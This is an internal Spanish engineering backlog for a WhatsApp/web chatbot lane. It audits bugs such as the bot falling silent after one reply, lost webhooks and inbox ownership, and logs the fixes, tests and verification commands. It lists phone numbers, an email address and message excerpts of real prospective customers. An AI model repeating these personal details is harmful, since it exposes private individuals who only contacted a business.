# La cola — carril `chatbot`

> **Por qué existe este archivo.** El carril chatbot era el único sin cola: tenía
> `hermes-content/docs/handoff/chatbot.md`, que es **estado**, no plan. Y sin cola no puede
> tener loop — un loop sin cola no tiene qué comer, así que el carril sólo avanza cuando
> alguien abre su sesión a mano.
>
> Su plan SÍ existía: estaba enterrado dentro del handoff como backlogs sucesivos (v2, v3, v4,
> v5, v6, v6.5, v6.6, v6.7). Esto lo saca a la superficie. Doctrina y formato:
> `hermes-content/docs/cola/README.md`.

**Extraído del handoff el 2026-08-31, con Gate 1 corrido ítem por ítem.** De 15 pendientes
heredados, **7 eran fantasma** (46%): ya estaban hechos y el handoff los seguía arrastrando.
Están abajo en "Cerrado", cada uno con el archivo y la línea que lo prueba.

---

**Auditoría del 2026-09-01 — qué se midió EN VIVO y qué cambió.** Se verificó cada pendiente
contra producción (SSH al VPS, las dos bases, el motor corrido de verdad), no contra el papel.

| | |
|---|---|
| **Lo más caro que nadie había medido** | El bot **contesta una sola vez y se calla para siempre** en modo venta. Se veía en la conversación de HOY. Ítem 1 |
| **Ya estaba resuelto — no entró** | La **alarma del watchdog**. Estaba anotado que 2.874 reinicios fallidos pasaron sin avisar a nadie y que faltaba construir el aviso. Los reinicios son reales (720/día del 25 al 27-ago), pero el watchdog **ya fue reescrito el 28-ago** con aviso a Telegram por incidente y por recuperación, marcador para no repetir, y las credenciales cargadas. Corre cada 2 min y hoy está sano. Escribirlo habría sido trabajo fantasma |
| **Un bloqueo VENCIDO** | El de los fines de línea del espejo pedía una decisión de Sergio que ya no existe. Pasó de "Después/bloqueado" a "Ahora/ítem 4" |
| **Una instrucción que EMPEORABA producción** | Encender `ONIA_N8N_ENABLED` "es una línea" era falso: sin URL el envío falla en silencio. Reescrito en el ítem 2 |
| **El gate estaba en rojo y nadie lo sabía** | `$ node scripts/verificar_cola.js hermes-content/docs/cola/chatbot.md` salía **exit 1** desde que se escribieron los ítems del canario. Dos de las tres causas eran el gate gritando en falso (URLs y bloques de código); están arregladas en el script, con sus casos de self-check |
| **Podado** | El ítem de campañas tenía **nueve** vueltas encimadas (~210 líneas) y la fila S8 arrastraba seis. La historia vive en el `git log` |

---

## Objetivo único

**Que un desconocido escriba y esa conversación se vea en la bandeja.**

**Hecho =** se abre `/inbox` con la sesión del dueño y hay una conversación de una persona
que no somos nosotros — ni una org QA, ni el probador, ni Sergio desde su celular.

**Por qué éste y no otro.** El producto está construido: bandeja nativa, editor conversacional,
multimedia, visión, comprobantes, insistencia, campañas, push. Trece piezas en tres días. Lo
que NO existe es la única prueba de que sirve: alguien de afuera usándolo. Un objetivo que
fuera "cerrar v6.8" o "difusiones masivas" agregaría la pieza catorce a un producto que
todavía no atendió a nadie.

**El estado de arranque, medido hoy:** el enlace de WhatsApp de onia.com.bo YA manda
desconocidos al +591 75414930, que está en Cloud API con el bot atendiendo
(`web-factory/apps/onia-platform/src/lib/site.ts:30-49`). O sea que la distribución existe
hace semanas. Lo que falta es la última cuadra: que esa conversación **aparezca en la
bandeja**, y que la respuesta sea la que corresponde a lo que la persona clickeó.

🎯 **La MITAD cumplida el 2026-08-31.** Sergio vinculó `Onia (interna)` al inbox 5 y la
pantalla se MIRÓ en producción con la sesión de esa org: `/inbox` lista a **mariohassen**
(+591 73021804, 27-ago) y a **F** (+591 73232758, 25-ago, la clínica odontológica de 4
doctores). Ninguno de los dos es QA, ni el probador, ni Sergio. La prueba está en el ítem 1
de "Cerrado". Contestarles es **S7**, y vende Sergio.

🔴 **La otra mitad NO está, y el 2026-08-31 se dio por cerrada de más.** Recontado hoy en la
base de producción: los desconocidos son **nueve conversaciones**, y **cinco entraron por el
widget de la web (inbox 4)** — las convs 34, 36, 38, 40 y 45. **El inbox 4 sigue sin org**, así
que ninguna de las cinco se puede abrir desde el producto, incluidas las **dos más nuevas**
(29-ago y 01-sep). Es el ítem 3 de "Ahora" y el bloqueo **S14**.

🔴 **Y apareció algo peor que la visibilidad, que nadie había medido: el bot contesta UNA vez
y se calla para siempre.** En modo venta —el de los inboxes 4 y 5, que es por donde entra todo
desconocido— **ninguna conversación recibió jamás una segunda respuesta**. Sin los dos horarios
de demo definidos, el bot deriva a un humano en el primer mensaje y después calla a propósito;
el aviso que debía traer a ese humano tampoco sale. O sea que **hoy la bandeja llena no
alcanzaría**: la persona que escribe queda esperando igual. Ítems 1 y 2 de "Ahora".

**Redefinición honesta del "hecho", 2026-09-01.** Que la conversación se VEA era la mitad
correcta del objetivo, pero es insuficiente sola. El objetivo se cumple cuando **un desconocido
escribe dos veces, el bot le contesta las dos, y esa conversación se abre en `/inbox`**.

⚠️ **Recontado el 2026-09-02 contra la base de HOY, no contra este párrafo: en inbox 4 ya no
son tres, son SEIS — y crecen sin que nadie las vea.** `docker exec` a `onia-chatbot-db`
(conversaciones × mensajes de `inbox_id=4`): 34 (24-ago, "hola", sin contacto), 36 (27-ago,
`Saguilera@ds-santacruz.bo`, ya en S7), 38 (29-ago, "hola", sin contacto), 40 (29-ago, sin
contacto), **45 (01-sep, "tengo una ferreteria", sin contacto)** y **46 (01-sep, "Hola,
quiero informacion... Tengo una clinica dental en Santa Cruz, somos 4 personas", sin
contacto)** — estas dos últimas no estaban contadas en ningún lado. De las seis, **cinco no
dejaron teléfono ni correo**: sólo se les puede contestar DESDE el widget, que es exactamente
lo que el inbox huérfano impide. La decisión §9 sigue en pie (opción 1, dejar el 4 sin dueño
"hasta que la limitación moleste") pero el propio dato que le faltaba a esa condición ya
está: **S14** en Bloqueado.

---

## Cómo se trabaja esta cola

Igual que las otras cuatro — el detalle está en `hermes-content/docs/cola/README.md`. El
resumen: un ítem por vuelta, Gate 1 antes de tocar nada (¿ya está hecho? verificar EN VIVO,
un grep sirve para descartar y nunca para confirmar), gates completos donde haya código
(`tsc --noEmit` + tests + `eslint`, los tres), y si toca pantalla **se abre y se MIRA**.

**Nada entra a "Ahora" sin evidencia de que existe**, y se verifica solo:

```bash
node scripts/verificar_cola.js hermes-content/docs/cola/chatbot.md
```

**Y nada se declara "listo para desplegar" sin que el deploy lo alcance:**

```bash
npm run deploy:alcanzable
```

Saca los commits de `onia-platform` que esta cola nombra y le pregunta a git si `origin/master`
—la rama de la que se buildea— los alcanza. Nace de que la misma fila (**S11**) falló tres veces:
el commit no existía, después existía sin estar mergeado. **Un párrafo que lista commits
envejece; esto no.** Hoy sale **0**: los 4 commits declarados llegan a `origin/master`. Fue el
gate el que destapó que **S16 había vencido** — ver el primer ítem de "Cerrado".

**Y ningún bloqueo le pide a Sergio algo que ya está resuelto:**

```bash
npm run bloqueos:vencidos
```

Corre el verificador que cada fila de "Bloqueado en Sergio" declara con la marca
`**Verificador:** \`<comando>\` → <código>`, y sale **1** nombrando las que ya están
satisfechas. Nace de que S16 declaraba el suyo y **ninguna vuelta lo corría**: venció en
silencio y se destapó de casualidad, ya vencido, adentro de una auditoría de los `[x]`.
Sólo ejecuta `npm run <script de package.json>` o `node <ruta del repo>`, siempre sin shell:
un gate que corre texto arbitrario sacado de un documento es peor que el problema que tapa.
Hoy sale **0** — S9 y S10 medidos vivos, los dos siguen bloqueados.

**Y la bandeja del objetivo no se da vuelta sola sin que nadie se entere:**

```bash
npm run inbox:tenencia
```

Le pregunta a la base de producción quién es dueño de cada inbox de Chatwoot. Sale **0** si
`Onia (interna)` tiene el inbox 5 —la tenencia que S8 dejó cerrada, y la única columna que
decide qué muestra `/inbox`— y **1** si se movió o si dos orgs reclaman el mismo inbox. Nace de
que **ya se dio vuelta una vez**, a las 02:02 del 1-sep, por un mecanismo que sigue sin
identificarse: la fila se borró y se re-creó por fuera de la app apuntando al inbox 4, y con eso
**S7 quedó roto sin que la cola lo supiera**. El ítem que lo arregló se cerró dejando escrito su
propio comando de verificación —y a nadie que lo corriera—, que es el molde con el que S16
venció en silencio. Hoy sale **0**.

**Y el objetivo del carril se comprueba solo, entero y por HTTP:**

```bash
npm run objetivo:visible
```

Genera una sesión del dueño real de la bandeja (preguntado a la base, no hardcodeado), llama a
`/api/bandeja` contra el host público y sale **0** si ahí hay alguien que no somos nosotros.
Es el ÚNICO gate que mide el objetivo y no una pieza suya: `inbox:tenencia` mide la columna, que
es el primer eslabón de cinco, y **los otros cuatro fallan devolviendo 200 con la lista vacía**.
Hoy sale **0** — mariohassen y F, por el camino completo.

**Nunca:** desplegar al VPS sin OK de Sergio · tocar otro carril (web-factory es dueño de
`web-factory/`, producto de la cola de plataforma) · gastar plata · bajar una superficie viva.

---

## Ahora

- [ ] 🔴 **Un mensaje que llega mientras el webhook está caído se pierde PARA SIEMPRE, y pasa
      una vez por día.** Abierto el 2026-09-03 **por el chequeo de arranque, no por la cola**:
      `node scripts/sonda_widget.mjs` salió *"EL BOT SE QUEDO MUDO — conversacion 49: #1 → 0
      respuesta(s) · #2 → 1 respuesta(s)"*.
      🔴 **La causa NO es el motor, y por eso una semana de diagnóstico miró el lugar equivocado.**
      Los tres relojes, medidos en vivo y pegados uno al lado del otro:
      `docker inspect onia-center --format '{{.State.StartedAt}}'` → **00:03:32** (el contenedor
      reinició) · mensaje **282** entrante **00:03:52**, sin respuesta jamás ·
      `/var/log/onia-bot-watchdog.log` **00:04:01** *"el webhook NO responde en :3020 —
      reiniciando"* · mensaje **283** entrante **00:04:08** → contestado a las **00:04:12**.
      El proceso del webhook cuelga de `docker exec -d` sobre `onia-center`: cuando el contenedor
      reinicia, se va con él. El watchdog lo levanta, pero tarda **hasta 2 minutos** — y en esa
      ventana Chatwoot ya disparó su **único** webhook contra un puerto muerto. **Chatwoot no
      reintenta.** El mensaje no se contesta nunca y nadie se entera.
      **No es raro: 20 reinicios del webhook entre el 28-ago y el 3-sep** (contados en
      `/tmp/onia-bot-webhook.log` dentro del contenedor). Cada uno es una ventana en la que un
      desconocido puede escribir y quedar colgado. Es el modo de falla escrito del carril —el
      primer mensaje anda, muere el segundo— pero **por debajo del motor**: el motor nunca se entera.
      **Construido y probado: `hermes-content/deploy/vps-ops/bot/rescate-run.mjs`** + sus 13
      casos (`hermes-content/deploy/vps-ops/bot/rescate-run.test.mjs`, **13/13**, rojo primero por `Cannot find module`). Pregunta
      quién escribió y sigue sin respuesta, y **reinyecta ese mensaje por el MISMO webhook con el
      MISMO payload de Chatwoot**. Reinyectar es seguro y eso es lo que lo hace barato: el
      `message_key` que arma es `chatwoot:<conv>:<msgId>`, **idéntico** al del webhook en vivo, así
      que si ya se procesó, `claimInbound` (unique en `bot_messages.message_key`) lo corta antes
      del motor — reinyectar de más da un *skip*, no una segunda respuesta.
      **Medido contra producción, no contra el test:** `node rescate-run.mjs` (seco) →
      *"conv 47 msg 249 — 427 min sin respuesta — «Tengo una clinica dental en Santa Cruz, somos 4
      personas»"*. **Encontró un huérfano real que nadie había visto.** La selección funciona.
      🔴 **Lo que FALTA, y es la última milla — 401:** `node rescate-run.mjs --emit` →
      `wget: server returned error: HTTP/1.1 401 Unauthorized`. El webhook autentica
      (`hermes-content/deploy/vps-ops/bot/webhook-security.mjs`) y la reinyección no va firmada. **Reproducción en 30 s:** correr ese
      comando. **El camino más corto está identificado, no hay que investigarlo de nuevo:** el
      `authenticateChatwootRequest` acepta **secreto en la ruta** (`/webhook/chatwoot/<secreto>`,
      `verifyPathSecret`, línea 122) además de la firma HMAC. El secreto **no** está en el env del
      proceso (`cat /proc/<pid>/environ` sólo trae `ONIA_WEBHOOK_PORT`): vive en el archivo que
      apunta `ONIA_WEBHOOK_ENV_FILE` en `hermes-content/deploy/vps-ops/bot/webhook-server.sh`. Leerlo de ahí y agregarlo a la URL de
      `postAlWebhook` cierra el ítem.
      ⚠️ **Y falta desplegarlo**: `/opt/onia/bot` es rsync, no git. Commiteado, **NO desplegado**.
      ⚠️ **De paso, medido: el log por mensaje que esta cola da por cerrado NO está corriendo.**
      `/opt/onia/bot/webhook-server.mjs` es del **29-ago** y tiene **cero** llamadas a `traza(`;
      el del repo tiene 2. Por eso `/tmp/onia-bot-webhook.log` sigue teniendo **sólo** líneas de
      arranque. El ítem de abajo es honesto (dice "commiteado"), pero mientras no se despliegue el
      loop sigue diagnosticando a ciegas — que es exactamente lo que costó la semana.

- [x] 🔴 **La sonda reusa UNA conversación para siempre, así que desde la segunda vuelta ya no
      mide "un desconocido escribe dos veces": mide una charla con ocho turnos encima.**
      **CERRADO el 2026-09-02.** La causa medida no era la que este ítem suponía, y la diferencia
      importa: no es que la conversación "crezca" y confunda a la sonda por largo — es que llega a
      un estado donde **el bot calla POR DISEÑO**. Prueba, no hipótesis:
      `select bot_stage, human_took_over from onia_center.bot_conversations where
      conversation_key='chatwoot:49';` → **`handoff_humano|f`**. El motor lo silencia en
      `hermes-content/deploy/vps-ops/bot/bot-engine.mjs:459` y en el `case "handoff_humano"` de la 591, que es lo CORRECTO: el bot
      derivó a Sergio. La sonda gritaba "EL BOT SE QUEDO MUDO" con el bot sano — a las 20:19 y a
      las 21:09 del mismo día había contestado los dos turnos.
      **Ojo con la base equivocada:** en Chatwoot la conversación 49 figura `open` y perfectamente
      sana. El estado que calla vive en OTRA base (`onia_center.bot_conversations` del
      `supabase-db`). Mirar sólo Chatwoot es lo que mantuvo este bug invisible.
      **El arreglo — desarmar antes de medir**, con su caso en rojo primero
      (`necesitaDesarme is not defined`, 21/25) y verde después (25/25). No inventa un camino:
      usa el que el producto ya define — `clearHumanTakeover` (mismo archivo, línea 117) dice *"resolver significa terminé"* y
      devuelve `handoff_humano` a `nuevo`. Se resuelve **por Rails** para que corra el camino real
      (Chatwoot emite `conversation_status_changed` → el adapter lo traduce), así cada vuelta
      verifica de paso que ese desarme sigue vivo. Medido en vivo: `resolved` → **4 segundos** →
      `bot_stage=nuevo`.
      **Falla hacia el 2, nunca hacia el 1:** si el desarme no devuelve la conversación, la sonda
      dice "NO SE PUDO MEDIR", no "el bot está mudo". Confundir esas dos cosas es exactamente lo
      que costó esta vuelta.
      **Verificación final:** `node scripts/sonda_widget.mjs` → **exit 0**, *"EL BOT CONTESTO LOS 2
      — conversacion 49"*. Antes del arreglo, mismo comando: exit 1, 2 de 2 sin respuesta.
      ⚠️ **La corrección que este ítem proponía (resolver para que se abra una conversación NUEVA)
      no es lo que pasó:** medido, el widget siguió escribiendo en la **49**. Alcanza igual, porque
      lo que había que resetear era el estado del motor, no el hilo. Anotado para que nadie
      "arregle" después el hecho de que la conversación no se renueve.
      <!-- Diagnóstico original, conservado: llegó a la causa correcta a medias -->
      Medido hoy
      2026-09-02, no supuesto — y es un **falso rojo**, el peor defecto posible en el instrumento
      que decide si el carril está roto. Archivo: `scripts/sonda_widget.mjs`.
      **Reproducción exacta, 2 minutos:** `node scripts/sonda_widget.mjs` dos veces seguidas. La
      primera salió **0** (21:09:04 y 21:09:19, las dos contestadas: mensajes 264→265 y 266→267);
      la segunda, **40 segundos después**, salió **1** — mensaje **270** (21:09:59) sin respuesta
      **90 s después**, verificado en la base, no por timeout de la sonda:
      `docker exec <chatwoot-db> psql -U postgres -d onia-chatbot -tAc "select id, message_type,
      created_at, left(content,70) from messages where conversation_id=49 order by created_at;"`
      **Por qué NO es el bug del bot.** En esa tercera repetición el bot ya venía de contestar
      *"¿En qué horario te viene mejor…"* y *"Eso lo tiene que ver Sergio, no yo"*: la máquina de
      estados está a ocho turnos de la bienvenida. Ningún lead de verdad llega ahí en su segundo
      mensaje. La sonda está juzgando un estado conversacional que su propia definición de hecho
      no describe.
      **De dónde viene:** la conversación se reusa para esquivar el tope de 5 aperturas/hora, y esa
      decisión —correcta contra el 429— arrastró un efecto que nadie midió: la conversación **crece**
      y el estado del bot se va con ella.
      **El dato que hace barata la corrección, medido hoy:** el inbox 4 tiene
      `lock_to_single_conversation = f` (`select id, name, lock_to_single_conversation from
      inboxes where id in (4,5);` → `4|Onia Web|f`). O sea que **resolviendo** la conversación
      antes de medir, el próximo mensaje del widget abre una **nueva** — conversación fresca cada
      vuelta, sin tocar el throttle, porque el token se sigue firmando por Rails
      (`guionBootstrap`), que nunca pasa por `/widget`. Es un `update` de estado en el guión de
      Rails que ya existe, más su caso en rojo primero.
      ⚠️ **No confundir con "arrancar de cero cada vez":** un contacto nuevo por vuelta ensucia el
      inbox 4, que es donde viven los leads de verdad (ya pasó: 12 contactos anónimos el 2026-09-02).
      El contacto se reusa; lo que se renueva es la conversación.

- [x] **El chequeo de "hecho" de este carril funcionó UNA sola vez en su vida, y el arreglo
      anterior es el que lo garantizó.** Hecho el 2026-09-02. Archivo: `scripts/sonda_widget.mjs`.
      **Gate 1: el ítem era REAL y salió del propio chequeo de arranque**, no de la cola —
      `node scripts/sonda_widget.mjs` daba **exit 2**, `Timeout 30000ms … waiting for
      locator('#chat-input')`. La vuelta anterior había cerrado la sonda declarándola viva, y lo
      estaba: la conversación **49** existe con sus dos turnos contestados (mensajes 257-263,
      20:19-20:20). Midió una vez y no volvió a medir nunca.
      🔴 **Las dos causas, MIRADAS renderizadas con Chromium — ninguna era la que decía el error.**
      **(1) El botón cambia de rótulo.** Para esquivar el tope de 5 aperturas/hora la sonda entra
      con `cw_conversation` y **reusa su conversación** — y con conversación ya empezada Chatwoot
      rotula el botón **"Continuar conversación"**, no "Iniciar conversación", que era lo único que
      el localizador buscaba. O sea que el arreglo del 429 **se saboteó a sí mismo**: la primera
      vuelta (contacto recién creado, sin conversación) decía "Iniciar" y anduvo; **todas las
      siguientes decían "Continuar" y morían**. Es exactamente el modo de falla que este carril
      tiene escrito — *un chequeo que mira el primer paso no ve un sistema que muere en el segundo*—
      esta vez adentro del chequeo mismo.
      **(2) Y aun clickeando por rótulo correcto, no alcanzaba: no había a quién clickear todavía.**
      `goto` vuelve con `domcontentloaded` y en ese instante el Vue del widget **no dibujó nada**:
      `document.querySelectorAll('button')` devuelve **cero**. La sonda no clickeaba, esperaba 30 s
      una caja que no se iba a montar, y el mensaje de Playwright no decía ni una palabra de esto.
      Con 6 s de espera los dos botones están y el clic funciona.
      **Qué se construyó.** `elegirArranque()` —pura y exportada— elige el botón **por estructura y
      no por rótulo**: descarta el de cerrar y los sin texto, y entre los que quedan prefiere el que
      habla de la conversación. Sobrevive a "Continuar", a un cambio de idioma y al próximo cambio
      de copy. Más un bucle que **espera a que el widget monte** antes de mirarle los botones, y un
      diagnóstico que, si igual no aparece `#chat-input`, imprime **los botones y el texto de la
      pantalla**. Eso último no es adorno: esta misma falla costó una vuelta de diagnóstico a
      ciegas —se supuso un iframe que no existe, y después un rótulo que había cambiado— y el
      mensaje nuevo la resuelve en 5 segundos.
      **Rojo primero y por el motivo correcto.** Los 6 casos nuevos se corrieron contra la semántica
      vieja (la que estaba viva): **3 en rojo**, y el principal falló con **su propia** aserción —
      *"con «Continuar conversación» hay que clickear igual: es el mismo botón con otro rótulo"*.
      Los DOM de los casos son **reales**, leídos del widget de producción con Chromium: el de una
      vuelta cualquiera (`["…close-button", "Continuar conversación"]`) y el de la primerísima
      (`"Iniciar conversación"`). Los otros 3 son guardas: que no se arregle el caso 2 rompiendo el
      1, que **nunca** se clickee el botón de cerrar (cerraría el panel, con un síntoma idéntico al
      bug de hoy) y que la lista vacía dé -1 = *esperar*, no *no hay botón*.
      **Verificado en vivo, y verificado DOS veces a propósito** — que funcione una vez es
      justamente lo que ya pasaba: primera corrida **exit 0**, *"EL BOT CONTESTO LOS 2 —
      conversación 49"*; segunda corrida seguida, **midió otra vez** (dio 1, y ese 1 es el ítem
      abierto de arriba: la sonda mide, pero desde la vuelta 2 mide otra cosa).
      **Gates:** `npm test` completo en verde (exit 0), con `test:sonda-widget` **21/21**.

- [x] **El bot no dejaba NI UNA línea por mensaje, y por eso el bug de "contesta una vez y se
      calla" sobrevivió una semana con cinco personas reales del otro lado.** Hecho el 2026-09-02.
      Archivos: `hermes-content/deploy/vps-ops/bot/webhook-server.mjs` y
      `hermes-content/deploy/vps-ops/bot/webhook-server.test.mjs`.
      **Medido en vivo, no leído:** `/tmp/onia-bot-webhook.log` **dentro del contenedor
      `onia-center`** (en el host no existe: el bot corre con `docker exec -d`) tenía **2,5 MB y
      su última escritura era `2026-09-02T17:19:49Z`, la del arranque** — mientras la conversación
      **48** recibía mensajes a las 17:21:35 y 17:21:54. Cero líneas por webhook. La causa: el
      servidor **ya recibía** un `log`, pero sólo lo llamaba en dos errores raros (socket muerto y
      n8n); el camino del webhook no escribía nunca. **Un log que existe y no se llama es peor que
      no tenerlo, porque aparenta diagnóstico.**
      **Qué se construyó.** `formatearTraza()` (pura) + una `traza` que sale de **todas** las
      ramas de `handleChatwootWebhook`. Una línea por webhook con conversación, mensaje, entrada,
      etapa `antes->después`, el conteo de publicados sobre producidos y **el motivo**. Las tres ramas
      mudas se nombran distinto porque las tres devuelven 200 con cuerpos casi iguales y a ojo se
      leen como éxito: **`MUDO`** (el turno corrió y no produjo nada — el bug de la semana),
      **`NO_ENTREGADO`** (produjo respuesta y Chatwoot la rechazó — los cuatro días de agosto con
      `/health` en verde) e **`ignorado`**. Más `repetido`, `ERROR`, `rechazado` (auth: la rama que
      hay que ver cuando "no llegan los webhooks") y `respondio`.
      **La traza se arma envolviendo el pipeline, no en cada `return`.** Hay **nueve** salidas: la
      propiedad "todo webhook deja una línea" se rompe sola en cuanto alguien agregue la décima.
      Envolviendo, no hay forma de salir sin traza — y hay un test que lo exige en las ramas feliz,
      skip y auth.
      **Rojo primero y por el motivo correcto.** Los 7 casos nuevos se corrieron contra un stub que
      devolvía `""`, así que cada uno falló en **su propia** aserción, no por un error de módulo.
      **Y probado que MUERDE:** dos mutaciones, las dos rojas — `MUDO`→`respondio` (2 casos) y el
      servidor volviendo a **no** loguear, que es el estado de hoy en producción (1 caso).
      **Gates:** `npm run test:bot` **704/704** en verde (31 en este archivo, 7 nuevos).
      🔴 **COMMITEADO, NO DESPLEGADO.** `/opt/onia/bot` no es un checkout de git y el deploy no es
      de este carril. **Hasta que alguien copie el archivo y reinicie el bot, el log sigue ciego.**

- [x] 🔴 **El arreglo que hoy hace que el bot conteste dos veces está VIVO en producción y NO
      está en el repo: un `rsync` desde Windows lo borra y el bug de la semana vuelve.**
      Hecho el 2026-09-02. Archivos: `hermes-content/deploy/vps-ops/bot/bot-engine.mjs`,
      `hermes-content/deploy/vps-ops/bot/config.mjs` y
      `hermes-content/deploy/vps-ops/bot/knowledge.test.mjs`.
      **Gate 1 corrido, y el ítem era REAL:** el `diff` normalizado daba **25** líneas en
      `bot-engine.mjs` y **12** en `config.mjs` al empezar la vuelta. Ahora los dos dan **0** —
      el mismo comando que lo probó es el que lo cierra.
      🔴 **Lo que encontró el test que faltaba: el bug estaba blindado por su propio test.**
      `knowledge.test.mjs:487` **exigía** `botStage === "handoff_humano"` con el mensaje *"queda a
      cargo de un humano, no esperando una elección imposible"* — y `handoff_humano` es la barrera
      que devuelve **cero** respuestas para siempre (`bot-engine.mjs`, `case "handoff_humano"`).
      O sea: el test verificaba que el mensaje de bienvenida fuera correcto **y exigía el estado
      que hace callar al bot**. Verde, y la conversación moría en el segundo mensaje. Copiar los
      dos archivos sin tocar esa línea habría dejado el gate en rojo y el arreglo pareciendo un
      error.
      **Rojo primero y por el motivo correcto.** El test nuevo —*"sin horarios el bot sigue vivo en
      el SEGUNDO mensaje"*— corrió **antes** del arreglo y falló con su propia aserción:
      `el bot NO puede quedarse mudo en el segundo mensaje`. No falló por un módulo ni por una
      importación: por la propiedad que importa. Encadena dos turnos con `DEFAULT_CONFIG` (los
      slots reales de producción, en "pendiente de definir"), que es la única forma de ver un
      sistema que muere en el segundo turno.
      **Y probado que MUERDE: dos mutaciones, las dos rojas.** `botStage` de vuelta a
      `handoff_humano` → **2** casos rojos (el nuevo y el corregido); `M0b_SIN_HORARIOS` borrado
      → **1** rojo, por el placeholder *"HORARIO A (pendiente de definir)"* llegándole al
      prospecto.
      **Gates:** `npm run test:bot` **705/705** en verde (1 caso nuevo, 1 aserción corregida).
      ⚠️ **`config.mjs` se dejó byte a byte igual a producción, orden de claves incluido**
      (`M0b_SIN_HORARIOS` **antes** de `M0b`, con los dos bloques de comentario apilados). Se
      probó al revés primero y el `diff` daba **14** líneas de puro orden: el chequeo del ítem
      habría seguido gritando con el arreglo ya versionado, que es exactamente el fantasma que
      esta cola mide. Un orden más lindo no vale un gate ambiguo.
      **Esto NO despliega nada**: producción ya tenía el arreglo — lo que faltaba era la copia
      versionada que impide que un `rsync` desde Windows lo borre. El sentido del ítem era el
      inverso al habitual: acá el repo iba **atrás** de producción.

- [x] **El objetivo del carril se daba por cumplido leyendo un párrafo del 31-ago, y las cuatro
      formas en que puede romperse devuelven 200 con la lista vacía.** Hecho el 2026-09-02,
      auditando los `[x]` (nivel 2 de la escalera: "Ahora" no tenía ítems sin empezar y los tres de
      "Después" no son promovibles). Archivos: `scripts/objetivo_visible.mjs` (nuevo), `package.json`.
      **Gate 1 primero, y el `[x]` auditado resultó CIERTO hoy** — el ítem *"CERRADO el 2026-08-31
      (novena vuelta): hay dos desconocidos en `/inbox` de producción"*. Medido por el camino real,
      no leído: sesión del dueño → `GET https://app.onia.com.bo/api/bandeja` → **200**,
      `sinCanal:false`, tres conversaciones — **#37 mariohassen (+59173021804)** y **#35 F
      (+59173232758)**, más la #11 de Sergio, que es nuestra. El objetivo del carril sigue vivo.
      🔴 **Lo que NO estaba, y es el ítem: nada lo comprobaba.** `inbox:tenencia`, construido la
      vuelta anterior, mide `clinic_settings.chatwootInboxId` — el **primer eslabón de cinco**.
      Entre esa columna y el ojo del dueño hay cuatro capas más, y **tres fallan mudas**, con un
      200 indistinguible del éxito: la org sin inbox (`200 {sinCanal:true}`), el token de Chatwoot
      del contenedor sin membresía en el inbox (`200 {conversaciones:[]}`), y `esDeInbox` filtrando
      todas las filas (igual). La capa del token no es hipotética: **esta misma cola la nombra**
      *"exactamente el fantasma que este carril mide"*, y se comprobó a mano UNA vez, el 31-ago.
      **Y la receta para volver a mirarlo vivía sólo en la prosa de ese ítem cerrado**
      (`generate_link` → `verify` → cookies con `@supabase/ssr`) — el mismo molde con el que **S16
      venció en silencio** y **S11 se comprobaba a mano**. Ahora es ejecutable.
      **Qué se construyó.** `npm run objetivo:visible` sale **0** si la bandeja del dueño trae al
      menos una conversación de alguien que no somos nosotros, **1** si el objetivo se rompió
      (nombrando cuál de las cuatro capas), **2** si no pudo medir. No hardcodea al dueño: le
      pregunta a la base **quién** tiene el inbox 5 y entra como esa persona, así que si la bandeja
      cambia de org el gate sigue midiendo al dueño real. Y no hardcodea a mariohassen: exige
      "≥1 que no somos nosotros", porque un gate que exige un nombre se muere el día que esa
      conversación se borra.
      **Probado que MUERDE, y ahí aparecieron cuatro casos que pasaban en falso.** Siete mutaciones
      al veredicto, las siete rojas (2 a 9 casos cada una). Las mutaciones destaparon que
      `codigo === 1` **no alcanzaba** para `sinCanal` ni para la lista vacía: apagando cualquiera de
      esas ramas el flujo cae igual en "SOLO NOSOTROS", que también es 1 — o sea que el caso pasaba
      con la rama rota. Se afirma el **diagnóstico**, no sólo el código: un rojo por el motivo
      equivocado manda a mirar el archivo equivocado. Lo mismo con el 502, que sin su rama caía en
      "200 sin array" y devolvía 2 igual. Y el caso del `\b` del regex estaba mal elegido:
      `"Prudencia"` no contiene `"prueba"`, así que pasaba con el regex aflojado — reemplazado por
      el apellido real **`Testa`**, que sí contiene `test`. **Un caso que no puede fallar no es un caso.**
      **Las cuatro salidas en vivo, contra producción:** real → **0**; host que no es el producto →
      **2**; contenedor de base inexistente → **2**; sin `@supabase/ssr` → **2**.
      ⚠️ **Sólo lectura, y con dos cuidados que no son adorno:** nunca abre una conversación (eso la
      marcaría como leída en el Chatwoot de gente real), y **nunca hace `signOut`** — el perfil del
      dueño es el mismo que usa Sergio y un signOut global lo sacaría de su propia sesión.
      **Gates:** `npm test` completo en verde, con `test:objetivo-visible` (30 casos) cableado a la
      cadena — verificado **en rojo primero**: `test:guards-cableados` mordió con *"estos tests
      existen y NO los corre nadie: test:objetivo-visible"* antes de cablearlo.

- [x] **La bandeja del objetivo ya se había dado vuelta sola una vez, y lo único que la vigilaba
      era un comando escrito en un párrafo.** Hecho el 2026-09-02, auditando los `[x]` (nivel 2 de
      la escalera: "Ahora" no tenía ítems y los tres de "Después" no son promovibles).
      Archivos: `scripts/inbox_tenencia.mjs` (nuevo), `package.json`.
      **Gate 1 primero, y el `[x]` auditado resultó CIERTO hoy:** `Onia (interna)` sigue con el
      inbox 5 — medido en `supabase-db`, no leído, con `updatedAt = 2026-09-02 05:09:11`, que es
      el `UPDATE` de la restauración (su commit `fc58f298` es de las 05:11:18). Nadie lo volvió a
      tocar. Pero ese ítem se cerró **declarando su propio agujero**: *"ningún gate de este carril
      mide hoy la tenencia del inbox 5… se deja escrito el comando de verificación para el próximo
      Gate 1"*. Un comando parado en un documento es el molde exacto con el que **S16 venció en
      silencio** y con el que **S11 se comprobaba a mano**. Ahora es ejecutable.
      **Qué se construyó.** `npm run inbox:tenencia` le pregunta a la base de producción quién es
      dueño de cada inbox de Chatwoot. Sale **0** si `Onia (interna)` tiene el 5, **1** si la
      tenencia se movió, **2** si no pudo medir (no medir no es estar bien). Importa más que los
      otros tres gates del carril: `espejo-check`, `campanas-vivas` y `marca-chatwoot` miden código
      y HTML público; **éste mide la única columna que decide si el objetivo se ve** — `/inbox`
      filtra por `clinic_settings.chatwootInboxId` y sólo por esa (`lib/chatbot/bandeja-auth.ts:22`).
      **Rojo por el motivo correcto, y contra bytes VIVOS.** Se leyó producción de verdad y a esa
      salida real se le aplicó el revert del 1-sep: sale 1, dice *"debería tener el inbox 5 y tiene
      el 4"* y agrega la pista forense que la propia cola manda mirar — el `id` de la fila es un
      UUID y no el `cuid()` que genera la app, o sea que se escribió **por fuera**.
